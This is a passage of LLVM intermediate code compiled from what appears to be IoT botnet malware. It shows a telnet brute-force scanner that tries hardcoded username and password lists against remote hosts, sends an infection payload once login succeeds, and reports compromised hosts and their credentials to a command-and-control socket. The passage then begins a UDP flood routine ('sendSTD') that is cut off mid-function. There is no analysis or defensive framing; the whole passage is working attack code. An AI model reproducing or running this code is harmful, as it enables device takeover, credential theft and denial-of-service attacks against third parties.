  %439 = call i32 @read_until_response(i32 %432, i32 %433, i8* %438, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %440 = icmp ne i32 %439, 0
  br i1 %440, label %441, label %458

; <label>:441:                                    ; preds = %427
  %442 = load i32, i32* %5, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %443
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %444, i32 0, i32 9
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @contains_fail(i8* %446)
  %448 = icmp ne i32 %447, 0
  br i1 %448, label %449, label %453

; <label>:449:                                    ; preds = %441
  %450 = load i32, i32* %5, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %451
  call void @advance_telstate(%struct.telstate_t* %452, i32 0)
  br label %457

; <label>:453:                                    ; preds = %441
  %454 = load i32, i32* %5, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %455
  call void @advance_telstate(%struct.telstate_t* %456, i32 5)
  br label %457

; <label>:457:                                    ; preds = %453, %449
  br label %857

; <label>:458:                                    ; preds = %427
  %459 = load i32, i32* %5, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 7
  %463 = load i32, i32* %462, align 16
  %464 = add i32 %463, 3
  %465 = zext i32 %464 to i64
  %466 = call i64 @time(i64* null) #2
  %467 = icmp slt i64 %465, %466
  br i1 %467, label %468, label %472

; <label>:468:                                    ; preds = %458
  %469 = load i32, i32* %5, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %470
  call void @reset_telstate(%struct.telstate_t* %471)
  br label %472

; <label>:472:                                    ; preds = %468, %458
  br label %856

; <label>:473:                                    ; preds = %91
  %474 = load i32, i32* %5, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %475
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %476, i32 0, i32 0
  %478 = load i32, i32* %477, align 16
  %479 = load i32, i32* %5, align 4
  %480 = sext i32 %479 to i64
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 5
  %483 = load i8, i8* %482, align 1
  %484 = zext i8 %483 to i64
  %485 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %484
  %486 = load i8*, i8** %485, align 8
  %487 = load i32, i32* %5, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 5
  %491 = load i8, i8* %490, align 1
  %492 = zext i8 %491 to i64
  %493 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %492
  %494 = load i8*, i8** %493, align 8
  %495 = call i64 @strlen(i8* %494) #10
  %496 = call i64 @send(i32 %478, i8* %486, i64 %495, i32 16384)
  %497 = icmp slt i64 %496, 0
  br i1 %497, label %498, label %502

; <label>:498:                                    ; preds = %473
  %499 = load i32, i32* %5, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %500
  call void @reset_telstate(%struct.telstate_t* %501)
  br label %857

; <label>:502:                                    ; preds = %473
  %503 = load i32, i32* %5, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 16
  %508 = call i64 @send(i32 %507, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %509 = icmp slt i64 %508, 0
  br i1 %509, label %510, label %514

; <label>:510:                                    ; preds = %502
  %511 = load i32, i32* %5, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %512
  call void @reset_telstate(%struct.telstate_t* %513)
  br label %857

; <label>:514:                                    ; preds = %502
  %515 = load i32, i32* %5, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %516
  call void @advance_telstate(%struct.telstate_t* %517, i32 6)
  br label %856

; <label>:518:                                    ; preds = %91
  %519 = load i32, i32* %5, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 0
  %523 = load i32, i32* %522, align 16
  %524 = load i32, i32* %3, align 4
  %525 = load i32, i32* %5, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 9
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @read_until_response(i32 %523, i32 %524, i8* %529, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %531 = icmp ne i32 %530, 0
  br i1 %531, label %532, label %603

; <label>:532:                                    ; preds = %518
  %533 = call i64 @time(i64* null) #2
  %534 = trunc i64 %533 to i32
  %535 = load i32, i32* %5, align 4
  %536 = sext i32 %535 to i64
  %537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %536
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %537, i32 0, i32 7
  store i32 %534, i32* %538, align 16
  %539 = load i32, i32* %5, align 4
  %540 = sext i32 %539 to i64
  %541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %540
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %541, i32 0, i32 9
  %543 = load i8*, i8** %542, align 8
  %544 = call i32 @contains_fail(i8* %543)
  %545 = icmp ne i32 %544, 0
  br i1 %545, label %546, label %550

; <label>:546:                                    ; preds = %532
  %547 = load i32, i32* %5, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %548
  call void @advance_telstate(%struct.telstate_t* %549, i32 0)
  br label %602

; <label>:550:                                    ; preds = %532
  %551 = load i32, i32* %5, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 9
  %555 = load i8*, i8** %554, align 8
  %556 = call i32 @contains_success(i8* %555)
  %557 = icmp ne i32 %556, 0
  br i1 %557, label %558, label %597

; <label>:558:                                    ; preds = %550
  %559 = load i32, i32* %5, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 3
  %563 = load i8, i8* %562, align 1
  %564 = zext i8 %563 to i32
  %565 = icmp eq i32 %564, 2
  br i1 %565, label %566, label %570

; <label>:566:                                    ; preds = %558
  %567 = load i32, i32* %5, align 4
  %568 = sext i32 %567 to i64
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %568
  call void @advance_telstate(%struct.telstate_t* %569, i32 7)
  br label %596

; <label>:570:                                    ; preds = %558
  %571 = load i32, i32* @mainCommSock, align 4
  %572 = load i32, i32* %5, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %573
  %575 = call i8* @get_telstate_host(%struct.telstate_t* %574)
  %576 = load i32, i32* %5, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %577
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %578, i32 0, i32 4
  %580 = load i8, i8* %579, align 2
  %581 = zext i8 %580 to i64
  %582 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %581
  %583 = load i8*, i8** %582, align 8
  %584 = load i32, i32* %5, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 5
  %588 = load i8, i8* %587, align 1
  %589 = zext i8 %588 to i64
  %590 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %589
  %591 = load i8*, i8** %590, align 8
  %592 = call i32 (i32, i8*, ...) @sockprintf(i32 %571, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.315, i32 0, i32 0), i8* %575, i8* %583, i8* %591)
  %593 = load i32, i32* %5, align 4
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %594
  call void @advance_telstate(%struct.telstate_t* %595, i32 7)
  br label %596

; <label>:596:                                    ; preds = %570, %566
  br label %601

; <label>:597:                                    ; preds = %550
  %598 = load i32, i32* %5, align 4
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %599
  call void @reset_telstate(%struct.telstate_t* %600)
  br label %601

; <label>:601:                                    ; preds = %597, %596
  br label %602

; <label>:602:                                    ; preds = %601, %546
  br label %857

; <label>:603:                                    ; preds = %518
  %604 = load i32, i32* %5, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %605
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %606, i32 0, i32 7
  %608 = load i32, i32* %607, align 16
  %609 = add i32 %608, 7
  %610 = zext i32 %609 to i64
  %611 = call i64 @time(i64* null) #2
  %612 = icmp slt i64 %610, %611
  br i1 %612, label %613, label %617

; <label>:613:                                    ; preds = %603
  %614 = load i32, i32* %5, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %615
  call void @reset_telstate(%struct.telstate_t* %616)
  br label %617

; <label>:617:                                    ; preds = %613, %603
  br label %856

; <label>:618:                                    ; preds = %91
  %619 = call i64 @time(i64* null) #2
  %620 = trunc i64 %619 to i32
  %621 = load i32, i32* %5, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %622
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %623, i32 0, i32 7
  store i32 %620, i32* %624, align 16
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 0
  %629 = load i32, i32* %628, align 16
  %630 = call i64 @send(i32 %629, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.316, i32 0, i32 0), i64 8, i32 16384)
  %631 = icmp slt i64 %630, 0
  br i1 %631, label %632, label %647

; <label>:632:                                    ; preds = %618
  %633 = load i32, i32* %5, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 0
  %637 = load i32, i32* %636, align 16
  %638 = call i32 @sclose(i32 %637)
  %639 = load i32, i32* %5, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 2
  store i8 0, i8* %642, align 8
  %643 = load i32, i32* %5, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 3
  store i8 1, i8* %646, align 1
  br label %857

; <label>:647:                                    ; preds = %618
  %648 = load i32, i32* %5, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 0
  %652 = load i32, i32* %651, align 16
  %653 = call i64 @send(i32 %652, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.317, i32 0, i32 0), i64 8, i32 16384)
  %654 = icmp slt i64 %653, 0
  br i1 %654, label %655, label %670

; <label>:655:                                    ; preds = %647
  %656 = load i32, i32* %5, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 0
  %660 = load i32, i32* %659, align 16
  %661 = call i32 @sclose(i32 %660)
  %662 = load i32, i32* %5, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 2
  store i8 0, i8* %665, align 8
  %666 = load i32, i32* %5, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 3
  store i8 1, i8* %669, align 1
  br label %857

; <label>:670:                                    ; preds = %647
  %671 = load i32, i32* %5, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 0
  %675 = load i32, i32* %674, align 16
  %676 = call i64 @send(i32 %675, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.318, i32 0, i32 0), i64 7, i32 16384)
  %677 = icmp slt i64 %676, 0
  br i1 %677, label %678, label %693

; <label>:678:                                    ; preds = %670
  %679 = load i32, i32* %5, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 0
  %683 = load i32, i32* %682, align 16
  %684 = call i32 @sclose(i32 %683)
  %685 = load i32, i32* %5, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 2
  store i8 0, i8* %688, align 8
  %689 = load i32, i32* %5, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 3
  store i8 1, i8* %692, align 1
  br label %857

; <label>:693:                                    ; preds = %670
  %694 = load i32, i32* %5, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %695
  %697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %696, i32 0, i32 0
  %698 = load i32, i32* %697, align 16
  %699 = call i64 @send(i32 %698, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.319, i32 0, i32 0), i64 4, i32 16384)
  %700 = icmp slt i64 %699, 0
  br i1 %700, label %701, label %716

; <label>:701:                                    ; preds = %693
  %702 = load i32, i32* %5, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 0
  %706 = load i32, i32* %705, align 16
  %707 = call i32 @sclose(i32 %706)
  %708 = load i32, i32* %5, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 2
  store i8 0, i8* %711, align 8
  %712 = load i32, i32* %5, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 3
  store i8 1, i8* %715, align 1
  br label %857

; <label>:716:                                    ; preds = %693
  %717 = load i32, i32* %5, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 0
  %721 = load i32, i32* %720, align 16
  %722 = call i64 @send(i32 %721, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.320, i32 0, i32 0), i64 26, i32 16384)
  %723 = icmp slt i64 %722, 0
  br i1 %723, label %724, label %739

; <label>:724:                                    ; preds = %716
  %725 = load i32, i32* %5, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %726
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %727, i32 0, i32 0
  %729 = load i32, i32* %728, align 16
  %730 = call i32 @sclose(i32 %729)
  %731 = load i32, i32* %5, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %732
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %733, i32 0, i32 2
  store i8 0, i8* %734, align 8
  %735 = load i32, i32* %5, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 3
  store i8 1, i8* %738, align 1
  br label %857

; <label>:739:                                    ; preds = %716
  %740 = load i32, i32* %5, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 0
  %744 = load i32, i32* %743, align 16
  %745 = load i32, i32* %3, align 4
  %746 = load i32, i32* %5, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 9
  %750 = load i8*, i8** %749, align 8
  %751 = call i32 @read_until_response(i32 %744, i32 %745, i8* %750, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @legit, i32 0, i32 0))
  %752 = icmp ne i32 %751, 0
  br i1 %752, label %753, label %855

; <label>:753:                                    ; preds = %739
  %754 = load i32, i32* %5, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 0
  %758 = load i32, i32* %757, align 16
  %759 = load i8*, i8** @rekdevice, align 8
  %760 = load i8*, i8** @rekdevice, align 8
  %761 = call i64 @strlen(i8* %760) #10
  %762 = call i64 @send(i32 %758, i8* %759, i64 %761, i32 16384)
  %763 = icmp sgt i64 %762, 0
  br i1 %763, label %764, label %768

; <label>:764:                                    ; preds = %753
  %765 = load i32, i32* %5, align 4
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %766
  call void @reset_telstate(%struct.telstate_t* %767)
  br label %768

; <label>:768:                                    ; preds = %764, %753
  %769 = call i32 @sleep(i32 20)
  %770 = load i32, i32* %5, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 0
  %774 = load i32, i32* %773, align 16
  %775 = load i32, i32* %3, align 4
  %776 = load i32, i32* %5, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 9
  %780 = load i8*, i8** %779, align 8
  %781 = call i32 @read_until_response(i32 %774, i32 %775, i8* %780, i32 1024, i8** getelementptr inbounds ([2 x i8*], [2 x i8*]* @infected, i32 0, i32 0))
  %782 = icmp ne i32 %781, 0
  br i1 %782, label %783, label %809

; <label>:783:                                    ; preds = %768
  %784 = load i32, i32* @mainCommSock, align 4
  %785 = load i32, i32* %5, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %786
  %788 = call i8* @get_telstate_host(%struct.telstate_t* %787)
  %789 = load i32, i32* %5, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 4
  %793 = load i8, i8* %792, align 2
  %794 = zext i8 %793 to i64
  %795 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %794
  %796 = load i8*, i8** %795, align 8
  %797 = load i32, i32* %5, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 5
  %801 = load i8, i8* %800, align 1
  %802 = zext i8 %801 to i64
  %803 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %802
  %804 = load i8*, i8** %803, align 8
  %805 = call i32 (i32, i8*, ...) @sockprintf(i32 %784, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.321, i32 0, i32 0), i8* %788, i8* %796, i8* %804)
  %806 = load i32, i32* %5, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %807
  call void @reset_telstate(%struct.telstate_t* %808)
  br label %857

; <label>:809:                                    ; preds = %768
  %810 = load i32, i32* %5, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 7
  %814 = load i32, i32* %813, align 16
  %815 = add i32 %814, 60
  %816 = zext i32 %815 to i64
  %817 = call i64 @time(i64* null) #2
  %818 = icmp slt i64 %816, %817
  br i1 %818, label %819, label %854

; <label>:819:                                    ; preds = %809
  %820 = load i32, i32* %5, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 3
  %824 = load i8, i8* %823, align 1
  %825 = zext i8 %824 to i32
  %826 = icmp ne i32 %825, 3
  br i1 %826, label %827, label %850

; <label>:827:                                    ; preds = %819
  %828 = load i32, i32* @mainCommSock, align 4
  %829 = load i32, i32* %5, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %830
  %832 = call i8* @get_telstate_host(%struct.telstate_t* %831)
  %833 = load i32, i32* %5, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 4
  %837 = load i8, i8* %836, align 2
  %838 = zext i8 %837 to i64
  %839 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %838
  %840 = load i8*, i8** %839, align 8
  %841 = load i32, i32* %5, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 5
  %845 = load i8, i8* %844, align 1
  %846 = zext i8 %845 to i64
  %847 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %846
  %848 = load i8*, i8** %847, align 8
  %849 = call i32 (i32, i8*, ...) @sockprintf(i32 %828, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.322, i32 0, i32 0), i8* %832, i8* %840, i8* %848)
  br label %850

; <label>:850:                                    ; preds = %827, %819
  %851 = load i32, i32* %5, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i64 %852
  call void @reset_telstate(%struct.telstate_t* %853)
  br label %854

; <label>:854:                                    ; preds = %850, %809
  br label %855

; <label>:855:                                    ; preds = %854, %739
  br label %856

; <label>:856:                                    ; preds = %855, %617, %514, %472, %423, %381, %335, %236, %91
  br label %857

; <label>:857:                                    ; preds = %856, %783, %724, %701, %678, %655, %632, %602, %510, %498, %457, %419, %407, %366, %316, %312, %198, %167, %154
  %858 = load i32, i32* %5, align 4
  %859 = add nsw i32 %858, 1
  store i32 %859, i32* %5, align 4
  br label %73

; <label>:860:                                    ; preds = %73
  br label %71
}

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i64, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca [12 x i8], align 1
  %18 = alloca [78 x i8*], align 16
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %11, align 4
  %20 = call i64 @time(i64* null) #2
  store i64 %20, i64* %14, align 8
  %21 = call noalias i8* @malloc(i64 1024) #2
  store i8* %21, i8** %16, align 8
  %22 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  %23 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %24 = load i32, i32* %5, align 4
  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %24) #2
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %27 = call i32 @strcmp(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.324, i32 0, i32 0)) #10
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %30, label %29

; <label>:29:                                     ; preds = %3
  store i32 1, i32* %11, align 4
  br label %30

; <label>:30:                                     ; preds = %29, %3
  %31 = bitcast [78 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %31, i8* bitcast ([78 x i8*]* @sendSTD.randstrings to i8*), i64 624, i32 16, i1 false)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = load i8*, i8** %4, align 8
  %35 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i32 0, i32 0
  %36 = call i32 (i32, i8*, ...) @sockprintf(i32 %33, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i32 0, i32 0), i8* %34, i8* %35)
  br label %37

; <label>:37:                                     ; preds = %86, %30
  %38 = load i32, i32* %11, align 4
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %37
  %41 = call i32 @rand() #2
  %42 = srem i32 %41, 65535
  %43 = add nsw i32 %42, 1026
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  br label %52

; <label>:47:                                     ; preds = %37
  %48 = load i32, i32* %5, align 4
  %49 = trunc i32 %48 to i16
  %50 = call zeroext i16 @htons(i16 zeroext %49) #13
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %50, i16* %51, align 2
  br label %52

; <label>:52:                                     ; preds = %47, %40
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %7, align 4
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %52
  br label %73

